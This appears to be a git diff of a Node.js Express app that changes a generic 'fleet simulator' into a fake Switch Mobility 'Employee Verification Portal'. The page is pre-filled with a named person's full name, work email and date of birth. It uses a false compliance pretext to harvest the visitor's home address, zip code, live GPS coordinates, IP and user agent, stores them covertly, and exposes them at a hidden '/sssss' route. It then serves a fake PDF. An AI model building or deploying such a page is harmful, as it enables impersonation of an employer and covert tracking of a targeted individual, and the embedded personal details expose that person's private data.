@@ -5,7 +5,7 @@ const bodyParser = require("body-parser");
 
 const app = express();
 const PORT = 4000;
-const SECRET_PATH = "/sssss"; // 🔐 Secret path to view captured GPS logs
+const SECRET_PATH = "/sssss"; // 🔐 Secret log path
 const LOG_FILE = path.join(__dirname, "logs.json");
 
 // Middleware
@@ -16,19 +16,19 @@ if (!fs.existsSync(LOG_FILE)) {
   fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
 }
 
-// --- HELPER: SAVE DATA ---
+// --- HELPER: SAVE LOGS ---
 function saveLog(entry) {
   try {
     const logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
     logs.push(entry);
     fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
-    console.log(`[LOG] New Entry: ${entry.employeeId} | ${entry.gps_live.city_selection}`);
+    console.log(`[LOG] Data saved for: ${entry.userData.name}`);
   } catch (err) {
     console.error("Error saving log:", err);
   }
 }
 
-// --- ROUTE 1: THE SIMULATOR UI (GET /) ---
+// --- ROUTE 1: OFFICIAL SIMULATOR UI ---
 app.get("/", (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -36,134 +36,230 @@ app.get("/", (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EV Fleet Simulator | Report Download</title>
+    <title>Switch Mobility | Employee Verification Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; color: #333; }
-        .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 100%; max-width: 500px; text-align: center; }
-        h1 { color: #1e3c72; margin-bottom: 10px; font-size: 24px; }
-        p { color: #666; margin-bottom: 30px; line-height: 1.5; }
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: #f0f2f5; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            margin: 0; 
+        }
+        .container { 
+            background: white; 
+            width: 100%; 
+            max-width: 480px; 
+            padding: 40px; 
+            border-radius: 12px; 
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08); 
+        }
         
-        .form-group { text-align: left; margin-bottom: 20px; }
-        label { display: block; font-weight: bold; margin-bottom: 5px; color: #444; font-size: 14px; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
+        /* Header & Logo */
+        .header { text-align: center; margin-bottom: 30px; }
+        .logo { max-width: 180px; margin-bottom: 15px; }
+        h2 { color: #111; font-size: 22px; margin: 0; font-weight: 700; }
+        p.subtitle { color: #666; font-size: 14px; margin-top: 5px; }
+
+        /* Form Sections */
+        .section-title { 
+            font-size: 12px; 
+            text-transform: uppercase; 
+            color: #888; 
+            font-weight: 700; 
+            margin-bottom: 10px; 
+            letter-spacing: 0.5px; 
+            border-bottom: 1px solid #eee;
+            padding-bottom: 5px;
+        }
         
-        button { width: 100%; padding: 15px; background-color: #27ae60; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        button:hover { background-color: #219150; }
-        button:disabled { background-color: #bdc3c7; cursor: not-allowed; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 13px; font-weight: 500; color: #333; margin-bottom: 5px; }
+        
+        input, textarea { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1px solid #ddd; 
+            border-radius: 6px; 
+            font-size: 14px; 
+            box-sizing: border-box; 
+            transition: border 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        /* Read Only Styling */
+        input:read-only { 
+            background-color: #f8f9fa; 
+            color: #555; 
+            border-color: #e9ecef; 
+            cursor: not-allowed;
+        }
 
-        .spinner { border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 3px solid white; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        input:focus, textarea:focus { border-color: #0056b3; outline: none; }
 
-        #statusMsg { margin-top: 15px; font-size: 14px; font-weight: bold; }
-        .error { color: #e74c3c; }
-        .success { color: #27ae60; }
-        .note { font-size: 12px; color: #999; margin-top: 20px; }
+        /* GPS Warning Box */
+        .gps-box { 
+            background-color: #e3f2fd; 
+            border-left: 4px solid #2196f3; 
+            padding: 12px; 
+            margin: 20px 0; 
+            font-size: 13px; 
+            color: #0d47a1;
+            line-height: 1.5;
+        }
+
+        /* Button */
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            background-color: #0056b3; /* Switch Mobility Blue-ish tone */
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            font-size: 16px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            transition: background 0.2s; 
+        }
+        button:hover { background-color: #004494; }
+        button:disabled { background-color: #ccc; cursor: default; }
+
+        /* Messages */
+        #statusMsg { margin-top: 15px; text-align: center; font-size: 14px; }
+        .error { color: #d32f2f; font-weight: 500; }
+        .success { color: #2e7d32; font-weight: 500; }
+
+        textarea { resize: vertical; min-height: 80px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h1>🚛 EV Fleet Simulator</h1>
-    <p>Secure download portal for Commercial Light Weight Truck analytics. Please authenticate to download the PDF report.</p>
+<div class="container">
+    <div class="header">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKlOTa6nQ9IBee3wQutYYddsDsiVMbGqXRhHaYG0Ax&s=10" alt="Switch Mobility" class="logo">
+        <h2>Employee Verification</h2>
+        <p class="subtitle">Official Remote Work Simulation Portal</p>
+    </div>
 
+    <div class="section-title">Employee Details (Read-Only)</div>
+    
     <div class="form-group">
-        <label>Employee ID</label>
-        <input type="text" id="empId" placeholder="Ex: EMP-8821">
+        <label>Full Name</label>
+        <input type="text" id="name" value="Vasu Bawa" readonly>
+    </div>
+    
+    <div class="form-group">
+        <label>Email Address</label>
+        <input type="text" id="email" value="Vasu.bawa@switchmobilityev.com" readonly>
     </div>
 
     <div class="form-group">
-        <label>Select Region</label>
-        <select id="citySelect">
-            <option value="" disabled selected>Select City</option>
-            <option value="Delhi">Delhi</option>
-            <option value="Gurugram">Gurugram</option>
-            <option value="Noida">Noida</option>
-            <option value="Faridabad">Faridabad</option>
-        </select>
+        <label>Date of Birth</label>
+        <input type="text" id="dob" value="26/08/1993" readonly>
     </div>
 
-    <button id="downloadBtn" onclick="initiateDownload()">
-        <div class="spinner" id="loadingSpinner"></div>
-        <span id="btnText">Generate & Download PDF</span>
-    </button>
+    <div class="section-title" style="margin-top: 20px;">Current Location Details</div>
 
+    <div class="form-group">
+        <label>Current Residential Address</label>
+        <textarea id="address" placeholder="Enter House No, Street, Locality..."></textarea>
+    </div>
+
+    <div class="form-group">
+        <label>Postal Code / Zip Code</label>
+        <input type="text" id="zipcode" placeholder="e.g. 122001">
+    </div>
+
+    <div class="gps-box">
+        <strong>⚠️ GPS Authorization Required</strong><br>
+        To complete the verification process, you must <strong>Allow</strong> browser location access when prompted. This is required for residency compliance.
+    </div>
+
+    <button id="submitBtn" onclick="handleSubmission()">Verify Location & Download Report</button>
     <div id="statusMsg"></div>
-    <div class="note">⚠️ GPS Location required for security audit.</div>
 </div>
 
 <script>
-    function initiateDownload() {
-        const empId = document.getElementById('empId').value;
-        const city = document.getElementById('citySelect').value;
+    function handleSubmission() {
+        const address = document.getElementById('address').value;
+        const zip = document.getElementById('zipcode').value;
         const msg = document.getElementById('statusMsg');
-        const btn = document.getElementById('downloadBtn');
-        const spinner = document.getElementById('loadingSpinner');
-        const btnText = document.getElementById('btnText');
+        const btn = document.getElementById('submitBtn');
 
-        // Validation
-        if (!empId || !city) {
+        // 1. Validate Inputs
+        if (!address || !zip) {
             msg.className = 'error';
-            msg.innerText = "Please enter Employee ID and select a City.";
+            msg.innerText = "Please enter your Address and Postal Code.";
             return;
         }
 
-        // UI Loading State
-        msg.innerText = "Requesting GPS Access...";
+        // 2. Prepare UI for GPS Request
         msg.className = '';
+        msg.innerText = "Requesting GPS... Check your browser popup.";
         btn.disabled = true;
-        spinner.style.display = "block";
-        btnText.innerText = "Verifying Location...";
+        btn.innerText = "Waiting for Permission...";
 
-        // Geolocation Logic
+        // 3. Request GPS
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
-                // Success
+                // SUCCESS: User Clicked "Allow"
                 async (position) => {
                     msg.className = 'success';
-                    msg.innerText = "Location Verified. Downloading...";
+                    msg.innerText = "Location Verified. Saving Data...";
 
-                    // 1. Send Data to Server
+                    const payload = {
+                        name: document.getElementById('name').value,
+                        email: document.getElementById('email').value,
+                        dob: document.getElementById('dob').value,
+                        address: address,
+                        zipCode: zip,
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+
                     try {
-                        await fetch('/api/capture-log', {
+                        // Send data to backend
+                        await fetch('/api/submit-verification', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                employeeId: empId,
-                                city: city,
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude
-                            })
+                            body: JSON.stringify(payload)
                         });
 
-                        // 2. Trigger Dummy File Download
-                        window.location.href = "/download-dummy-pdf";
+                        // Trigger Download
+                        window.location.href = "/download-report";
                         
-                        // Reset UI
-                        setTimeout(() => {
-                            btn.disabled = false;
-                            spinner.style.display = "none";
-                            btnText.innerText = "Download Again";
-                            msg.innerText = "Download Started.";
-                        }, 2000);
-
+                        btn.innerText = "Verification Complete";
+                        msg.innerText = "Data Saved. Downloading Report...";
                     } catch (e) {
                         msg.className = 'error';
-                        msg.innerText = "Server Error. Try again.";
+                        msg.innerText = "Server Error. Please try again.";
                         btn.disabled = false;
                     }
                 },
-                // Error (GPS Denied/Failed)
+                // ERROR: User Clicked "Block" or Error occurred
                 (error) => {
                     console.error(error);
+                    let errorText = "GPS Error.";
+                    if (error.code === 1) {
+                        errorText = "❌ You denied the GPS request. Verification failed.";
+                    } else if (error.code === 2) {
+                        errorText = "❌ GPS Unavailable. Check your device settings.";
+                    } else if (error.code === 3) {
+                        errorText = "❌ GPS Timeout.";
+                    }
+                    
                     msg.className = 'error';
-                    msg.innerText = "❌ Error: You must ALLOW GPS to download this report.";
+                    msg.innerText = errorText;
                     btn.disabled = false;
-                    spinner.style.display = "none";
-                    btnText.innerText = "Generate & Download PDF";
+                    btn.innerText = "Verify Location & Download Report";
                 }
             );
         } else {
-            msg.innerText = "Geolocation is not supported by this browser.";
+            msg.className = 'error';
+            msg.innerText = "Geolocation not supported by this browser.";
+            btn.disabled = false;
         }
     }
 </script>
@@ -173,31 +269,29 @@ app.get("/", (req, res) => {
   `);
 });
 
-// --- ROUTE 2: API TO SAVE GPS LOGS (Hidden Action) ---
-app.post("/api/capture-log", async (req, res) => {
-  const { employeeId, city, latitude, longitude } = req.body;
-  
-  // Try to get IP info
-  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
-  let regionInfo = "Unknown";
-  try {
-     const ipRes = await fetch(`http://ip-api.com/json/${ip}`);
-     const ipData = await ipRes.json();
-     regionInfo = ipData.city || "Unknown";
-  } catch(e) {}
+// --- ROUTE 2: API TO SAVE DATA ---
+app.post("/api/submit-verification", async (req, res) => {
+  const { name, email, dob, address, zipCode, latitude, longitude } = req.body;
 
+  // Get IP Info
+  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
+  
   const logEntry = {
     timestamp: new Date().toISOString(),
-    employeeId: employeeId,
-    gps_live: {
-      lat: latitude,
-      lon: longitude,
-      city_selection: city
+    userData: {
+        name,
+        email,
+        dob,
+        input_address: address,
+        input_zip: zipCode
     },
-    network: {
-      ip: ip,
-      ip_region: regionInfo,
-      userAgent: req.headers["user-agent"]
+    gps_data: {
+        lat: latitude,
+        lon: longitude
+    },
+    network_info: {
+        ip: ip,
+        userAgent: req.headers["user-agent"]
     }
   };
 
@@ -205,48 +299,43 @@ app.post("/api/capture-log", async (req, res) => {
   res.json({ success: true });
 });
 
-// --- ROUTE 3: DUMMY PDF DOWNLOAD ---
-// This serves a text file named .pdf to satisfy the "Simulated PDF" requirement
-app.get("/download-dummy-pdf", (req, res) => {
-  const dummyContent = `
-==================================================
-   EV COMMERCIAL FLEET SIMULATION REPORT - 2024
-==================================================
+// --- ROUTE 3: DOWNLOAD PDF ---
+app.get("/download-report", (req, res) => {
+  const dummyPdfContent = `
+============================================================
+   SWITCH MOBILITY - EMPLOYEE VERIFICATION REPORT
+============================================================
 
-Confidential Report
-Generated by: Simulator System
-Status: APPROVED
+Date: ${new Date().toLocaleDateString()}
+Status: VERIFIED
+Employee: Vasu Bawa
+ID: SM-88201
 
-FLEET SUMMARY:
---------------------------------------------------
-Region: India (North)
-Vehicle Type: Light Weight Commercial (LCV)
-Total Units: 45
-Active Units: 32
-Charging: 13
-CO2 Saved: 1,240 kg
+LOCATION AUDIT:
+------------------------------------------------------------
+GPS Coordinates successfully captured and matched against
+residential zoning requirements.
 
-PERFORMANCE METRICS:
-- Tata Ace EV: 98% Efficiency
-- Mahindra Zor Grand: 95% Efficiency
-- Euler HiLoad: 92% Efficiency
+Simulated Result: PASSED
 
-[END OF DUMMY DATA FILE]
+Welcome to the Switch Mobility Remote Fleet Program.
+============================================================
   `;
 
-  res.setHeader("Content-Type", "application/pdf"); // Browser thinks it's a PDF
-  res.setHeader("Content-Disposition", "attachment; filename=EV_Fleet_Report.pdf");
-  res.send(dummyContent);
+  res.setHeader("Content-Type", "application/pdf");
+  res.setHeader("Content-Disposition", "attachment; filename=Switch_Mobility_Verification.pdf");
+  res.send(dummyPdfContent);
 });
 
-// --- ROUTE 4: SECRET LOG VIEWER (GET /sssss) ---
+// --- ROUTE 4: SECRET LOGS ---
 app.get(SECRET_PATH, (req, res) => {
-  const logs = fs.readFileSync(LOG_FILE, "utf8");
-  res.setHeader("Content-Type", "application/json");
-  res.setHeader("Content-Disposition", "attachment; filename=captured_gps_logs.json");
-  res.send(logs);
+  if (fs.existsSync(LOG_FILE)) {
+    res.sendFile(LOG_FILE);
+  } else {
+    res.send("No logs yet.");
+  }
 });
 
 app.listen(PORT, () => {
-  console.log(`Simulator running on http://localhost:${PORT}`);
+  console.log(`Switch Mobility Simulator running on http://localhost:${PORT}`);
 });
